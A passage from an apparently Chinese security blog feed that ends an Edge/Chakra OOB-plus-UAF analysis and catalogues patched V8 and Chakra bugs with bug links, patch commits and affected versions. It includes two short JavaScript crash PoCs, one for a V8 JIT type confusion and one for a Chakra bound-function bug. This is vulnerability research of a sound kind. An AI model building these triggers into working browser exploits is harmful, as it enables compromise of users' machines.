class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int16Array:</span><br><span class="line">            VirtualTableInfo&lt;Int16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint16Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">            VirtualTableInfo&lt;Int32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>而Uint32对于0234是为了OOB，对于0236是保留一个指向缓冲区的引用，UAF。</p><p>但是0236的PoC单独使用是没有意义的，因为ClearLength将TypedArray的length清零，无法控制内存。<br>但是通过0234的JIT优化，去掉了边界检查，从而可以修改缓冲区，发挥UAF的威力。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>我觉得必要条件和充分条件是很有趣和有用的想法。<br>这其中还有一种对抗与脆弱性的思维在里面，一个有价值的漏洞引入的很可能不是一个地方有问题，而是类似实现的地方都有问题，通过这个poc可以触发，patch之后能不能找到类似的实现或者因为没有补全找到更多触发，甚至由于patch的不好引发新的安全问题，都有可能。<br>除此之外，将漏洞联系起来看，而不是单纯的去看一个OOB或者单纯一个UAF，能够更深入的思考漏洞的本质，找到更多利用的想法。</p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edge </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnerabilities from Chrome</title>
      <link href="/2018/07/23/Vulnerabilities/"/>
      <url>/2018/07/23/Vulnerabilities/</url>
      <content type="html"><![CDATA[<h1 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h1><h2 id="Bugs-715582"><a href="#Bugs-715582" class="headerlink" title="Bugs:715582"></a>Bugs:715582</h2><ul><li>Security: Out of bound read in FindSharedFunctionInfo (V8)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=715582" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=715582</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3" target="_blank" rel="noopener">https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3</a></li><li>影响版本：<br>6.0.92及以下</li><li>note<br>和AST遍历访问有关，比较特别，mark一下</li></ul><h2 id="Bugs-732169"><a href="#Bugs-732169" class="headerlink" title="Bugs:732169"></a>Bugs:732169</h2><ul><li>Ill in v8::internal::TranslatedState::MaterializeCapturedObjectAt<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=732169" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=732169</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93</a></li><li>影响版本<br>6.1.131及以下</li></ul><h2 id="CVE-2017-5115-Bugs-744584"><a href="#CVE-2017-5115-Bugs-744584" class="headerlink" title="CVE-2017-5115/Bugs:744584"></a>CVE-2017-5115/Bugs:744584</h2><ul><li>Bugs in type inference when replacing EffectPhi with Phi<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=744584" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=744584</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8</a></li><li>影响版本<br>6.2.0及以下</li></ul><h2 id="Bugs-746946"><a href="#Bugs-746946" class="headerlink" title="Bugs:746946"></a>Bugs:746946</h2><ul><li>Security: Chrome Type Confusion leads to Code Execution<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=746946" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=746946</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>note<br>这个洞我只是看到给了个exp，所以说记录一下，其实没什么可看的</li></ul><h2 id="Bugs-752149"><a href="#Bugs-752149" class="headerlink" title="Bugs:752149"></a>Bugs:752149</h2><ul><li>Security: Arbitrary bad cast in optimized Javascript code<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=752149" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=752149</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8</a></li><li>影响版本<br>6.2.170及以下</li></ul><h2 id="Bugs-757199"><a href="#Bugs-757199" class="headerlink" title="Bugs:757199"></a>Bugs:757199</h2><ul><li>DCHECK failure in result-&gt;owns_descriptors() in objects.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=757199" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=757199</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777" target="_blank" rel="noopener">https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777</a></li><li>影响版本<br>6.2.363及以下</li></ul><h2 id="Bugs-765433"><a href="#Bugs-765433" class="headerlink" title="Bugs:765433"></a>Bugs:765433</h2><ul><li>Security: V8 JIT escape analysis bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=765433" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=765433</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7</a><br>这是我们从那以后完全重写的旧逃逸分析中的一个错误。<br>好消息是，这是通过新的逃逸分析来解决的，坏消息是旧的逃逸分析已经消失，因此无法修复其中的错误。唯一可靠的方法似乎是禁用6.1中的逃逸分析。</li></ul><h2 id="Bugs-762874"><a href="#Bugs-762874" class="headerlink" title="Bugs:762874"></a>Bugs:762874</h2><ul><li>Security: off by one in TurboFan range optimization for String.indexOf<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=762874" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=762874</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa</a></li><li>影响版本<br>6.3.97及以下</li></ul><h2 id="Bugs-772420"><a href="#Bugs-772420" class="headerlink" title="Bugs:772420"></a>Bugs:772420</h2><ul><li>DCHECK failure in right_type()-&gt;Is(Type::PlainPrimitive()) in js-typed-lowering.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=772420" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=772420</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>影响版本<br>6.4.32及以下</li></ul><h2 id="Bugs-776677"><a href="#Bugs-776677" class="headerlink" title="Bugs:776677"></a>Bugs:776677</h2><ul><li>Security: V8:Use After Free Leads to Remote Code Execution(有exp)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b</a></li><li>影响版本<br>6.4.91及以下</li></ul><h2 id="Bugs-784533"><a href="#Bugs-784533" class="headerlink" title="Bugs:784533"></a>Bugs:784533</h2><ul><li>DCHECK failure in IsTyped(node) in node-properties.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=784533" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=784533</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604" target="_blank" rel="noopener">https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604</a></li><li>影响版本<br>6.4.289及以下</li></ul><h2 id="Bugs-788539"><a href="#Bugs-788539" class="headerlink" title="Bugs:788539"></a>Bugs:788539</h2><ul><li>CHECK failure: frame_state-&gt;opcode() == IrOpcode::kFrameState || (node-&gt;opcode() == IrOpcode::k<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=788539" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=788539</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a</a></li><li>影响版本<br>6.4.376及以下</li></ul><h2 id="Bugs-787910"><a href="#Bugs-787910" class="headerlink" title="Bugs:787910"></a>Bugs:787910</h2><ul><li>Use-after-poison in parameter_count<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=787910" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=787910</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6" target="_blank" rel="noopener">https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6</a></li><li>影响版本<br>6.4.363及以下</li></ul><h2 id="Bugs-791245"><a href="#Bugs-791245" class="headerlink" title="Bugs:791245"></a>Bugs:791245</h2><ul><li>Security: V8: JIT: Simplified-lowererer IrOpcode::kStoreField, IrOpcode::kStoreElement optimization bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791245" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791245</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf" target="_blank" rel="noopener">https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0</a><br><a href="https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e</a></li><li>影响版本<br>6.1.75-6.5.6</li></ul><h2 id="Bugs-791953"><a href="#Bugs-791953" class="headerlink" title="Bugs:791953"></a>Bugs:791953</h2><ul><li>CHECK failure: NumberToUint32 of kRepWord32 (Range(1, NUMBER)) cannot be changed to kRepTaggedS<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791953" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791953</a></li><li>patch<br>还没找到</li></ul><h2 id="Bugs-794394"><a href="#Bugs-794394" class="headerlink" title="Bugs:794394"></a>Bugs:794394</h2><ul><li>Security: V8: JIT: JSBuiltinReducer::ReduceObjectCreate fails to ensure that the prototype is “null”<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794394" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794394</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2</a></li><li>影响版本<br>5.7.447-6.5.67</li></ul><h2 id="Bugs-794822"><a href="#Bugs-794822" class="headerlink" title="Bugs:794822"></a>Bugs:794822</h2><ul><li>Chrome: V8: JIT: Type confusion in GetSpecializationContext<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794822" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794822</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433" target="_blank" rel="noopener">https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433</a></li><li>影响版本<br>6.5.71及以下</li></ul><h2 id="Bugs-797596"><a href="#Bugs-797596" class="headerlink" title="Bugs:797596"></a>Bugs:797596</h2><ul><li>DCHECK failure in IrOpcode::kMerge == control-&gt;opcode() in node-properties.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797596" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797596</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a</a></li><li>影响版本<br>6.5.107及以下</li></ul><h2 id="Bugs-794405-794359"><a href="#Bugs-794405-794359" class="headerlink" title="Bugs:794405/794359"></a>Bugs:794405/794359</h2><ul><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794405" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794405</a></p></li><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794359" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794359</a></p></li></ul><h2 id="Bugs-799263"><a href="#Bugs-799263" class="headerlink" title="Bugs:799263"></a>Bugs:799263</h2><ul><li>Chrome: V8: JIT: A bug in LoadElimination::ReduceTransitionElementsKind<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=799263" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=799263</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li><li>影响版本<br>6.4.66-6.5.143</li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li></ul><h2 id="Bugs-797130"><a href="#Bugs-797130" class="headerlink" title="Bugs:797130"></a>Bugs:797130</h2><ul><li>DCHECK failure in min_block == BasicBlock::GetCommonDominator(block, min_block) in scheduler.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797130" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797130</a></li><li>patch没找到</li></ul><h2 id="Bugs-801627"><a href="#Bugs-801627" class="headerlink" title="Bugs:801627"></a>Bugs:801627</h2><ul><li>V8: JIT: Type confusion in NodeProperties::InferReceiverMaps<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=801627" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=801627</a><br><a href="https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8</a></li><li>影响版本<br>v6.5.198及以下几个版本</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Here's a snippet of NodeProperties::InferReceiverMaps.</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kJSCreate: &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, effect)) &#123;</span><br><span class="line">          HeapObjectMatcher mtarget(GetValueInput(effect, 0));</span><br><span class="line">          HeapObjectMatcher mnewtarget(GetValueInput(effect, 1));</span><br><span class="line">          <span class="keyword">if</span> (mtarget.HasValue() &amp;&amp; mnewtarget.HasValue()) &#123;</span><br><span class="line">            Handle&lt;JSFunction&gt; original_constructor =</span><br><span class="line">                Handle&lt;JSFunction&gt;::cast(mnewtarget.Value());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (original_constructor-&gt;has_initial_map()) &#123;</span><br><span class="line">              Handle&lt;Map&gt; initial_map(original_constructor-&gt;initial_map());</span><br><span class="line">              <span class="keyword">if</span> (initial_map-&gt;constructor_or_backpointer() ==</span><br><span class="line">                  *mtarget.Value()) &#123;</span><br><span class="line">                *maps_return = ZoneHandleSet&lt;Map&gt;(initial_map);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">          <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>“mnewtarget” is expected to be a constructor which also can be of type JSBoundFunction. But “mnewtarget” is always cast to JSFunction which leads to type confusion.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --enable_slow_asserts</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="comment">// JSCreate emitted I guess.</span></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = <span class="built_in">Object</span>.bind();</span><br><span class="line"><span class="built_in">Reflect</span>.construct(Derived, [], bound);  <span class="comment">// Feed a bound function as new.target to the profiler, so HeapObjectMatcher can find it.</span></span><br><span class="line"></span><br><span class="line">%OptimizeFunctionOnNextCall(Derived);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Derived();</span><br></pre></td></tr></table></figure></p><h2 id="Bugs-802060"><a href="#Bugs-802060" class="headerlink" title="Bugs:802060"></a>Bugs:802060</h2><ul><li>DCHECK failure in op-&gt;IsAnyLocationOperand() in instruction.h<br>bug in x64 immediate operand handling for smi-converting loads<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802060" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802060</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02</a></li><li>影响版本<br>6.6.136及以下</li><li>note<br>看不懂2333</li></ul><h2 id="Bugs-802333"><a href="#Bugs-802333" class="headerlink" title="Bugs:802333"></a>Bugs:802333</h2><ul><li>Security: V8: A bug in the ObjectDescriptor class<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802333" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802333</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893</a></li><li>影响版本<br>6.6.85及以下</li></ul><h2 id="Bugs-803022"><a href="#Bugs-803022" class="headerlink" title="Bugs:803022"></a>Bugs:803022</h2><ul><li>DCHECK failure in current<em> == next</em> in node.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=803022" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=803022</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9</a></li><li>影响版本<br>6.6.45及以下</li></ul><h2 id="Bug-chromium-804801"><a href="#Bug-chromium-804801" class="headerlink" title="Bug: chromium:804801"></a>Bug: chromium:804801</h2><ul><li>CHECK failure: Type cast failed in CAST(add_func) at ../../src/builtins/builtins-collections-ge<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804801" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804801</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69</a></li><li>影响版本<br>6.6.54及以下</li></ul><h2 id="Bugs-804837"><a href="#Bugs-804837" class="headerlink" title="Bugs:804837"></a>Bugs:804837</h2><ul><li>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804837" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804837</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301</a></li><li>影响版本<br>6.6.45及以下</li></ul><h2 id="Bugs-818144"><a href="#Bugs-818144" class="headerlink" title="Bugs:818144"></a>Bugs:818144</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818144" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818144</a><br>没找到patch</p><h2 id="Bugs-818811"><a href="#Bugs-818811" class="headerlink" title="Bugs:818811"></a>Bugs:818811</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818811" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818811</a><br>没找到patch</p><h2 id="Bugs-819311"><a href="#Bugs-819311" class="headerlink" title="Bugs:819311"></a>Bugs:819311</h2><ul><li>DCHECK failure in op-&gt;opcode() == IrOpcode::kStateValues || op-&gt;opcode() == IrOpcode::kTypedStateV<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=819311" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=819311</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49" target="_blank" rel="noopener">https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49</a></li><li>影响范围<br>6.7.26及以下</li></ul><h2 id="Bugs-820984"><a href="#Bugs-820984" class="headerlink" title="Bugs:820984"></a>Bugs:820984</h2><ul><li>CHECK failure: InstructionSelector::SupportsSpeculationPoisoning() in pipeline.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=820984" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=820984</a><br>没找到patch，好像是回滚了</li></ul><h2 id="Bug-822284"><a href="#Bug-822284" class="headerlink" title="Bug:822284"></a>Bug:822284</h2><ul><li>ThinStrings are incompatible with TurboFan SeqString types<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=822284" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=822284</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8</a></li><li>引入漏洞的分支<br><a href="https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2</a></li><li>影响版本<br>6.5.245-6.7.86</li></ul><h2 id="Bugs-829679"><a href="#Bugs-829679" class="headerlink" title="Bugs:829679"></a>Bugs:829679</h2><ul><li>incorrect usages of SelectTaggedConstant()<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=829679" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=829679</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2</a></li><li>影响版本<br>6.7.245及以下</li></ul><h1 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h1><h2 id="关注更新"><a href="#关注更新" class="headerlink" title="关注更新"></a>关注更新</h2><p><a href="https://github.com/Microsoft/ChakraCore/wiki/Roadmap" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/wiki/Roadmap</a></p><h2 id="v1-8-3"><a href="#v1-8-3" class="headerlink" title="v1.8.3"></a>v1.8.3</h2><h3 id="CVE-2018-8139"><a href="#CVE-2018-8139" class="headerlink" title="CVE-2018-8139"></a>CVE-2018-8139</h3><ul><li>Microsoft Edge: Chakra: A bug in BoundFunction::NewInstance<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1569" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1569</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76</a></li><li><p>PoC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">new</span>.target.x;<span class="comment">//[0]-&gt;new.target跟在正常的参数之后，.x的时候会当JS对象处理，我在还原poc的时候new.target刚好是空指针，于是就读Null.x触发crash了。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = func.bind(&#123;&#125;, <span class="number">1</span>);<span class="comment">//-&gt;boundFunction-&gt;boundArgs[i]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(bound, []);</span><br></pre></td></tr></table></figure></li><li><p>Syntax<br>Reflect.construct<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct" target="_blank" 